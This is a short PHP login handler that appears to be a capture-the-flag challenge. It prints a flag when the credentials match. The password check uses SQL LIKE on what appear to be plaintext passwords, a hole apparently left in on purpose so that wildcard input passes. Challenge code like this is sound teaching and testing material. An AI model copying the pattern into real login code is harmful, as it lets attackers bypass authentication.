<?php

require_once(__DIR__  . "/config.php");

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username = :username AND password LIKE :password;";
    $sth = $db->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
    $sth->execute(array(':username' => $username, ':password' => $password));
    $users = $sth->fetchAll();

    if (count($users) === 1) {
        $msg = 'Welcome back admin ! Here is your flag : ' . FLAG;
    } else {
        $msg = 'Wrong username or password.';
    }
}
